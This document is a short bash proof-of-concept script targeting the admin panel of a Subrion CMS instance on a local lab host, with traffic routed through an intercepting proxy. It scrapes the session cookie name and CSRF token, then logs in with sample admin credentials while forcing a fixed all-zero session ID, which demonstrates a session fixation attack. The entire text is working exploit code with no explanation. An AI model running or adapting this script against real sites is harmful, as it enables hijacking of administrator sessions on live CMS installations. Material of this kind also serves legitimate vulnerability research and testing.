#!/bin/bash

username="admin"
password="Passw0rd!"
target="http://subrion.local/panel/"
proxy="http://127.0.0.1:8080"

# Grep Session Cookie Name
sess_cookie_name=$(curl -ks -x $proxy $target -I | grep "Set-Cookie" | head -n 1 | grep -oP "INTELLI_\w*")
# Grep CSRF Token
csrf_token=$(curl -ks -x http://127.0.0.1:8080 $target | grep "__st" | grep -oP "value=\"\K([a-zA-Z0-9]*)" | head -n 1)
# Fix the Session Cookie Value and login
curl -ks -x $proxy $target -X POST --data "__st=$csrf_token&username=$username&password=$password" -H "Cookie: loader=loaded; $sess_cookie_name=00000000000000000000000000" -i | grep "Set-Cookie"
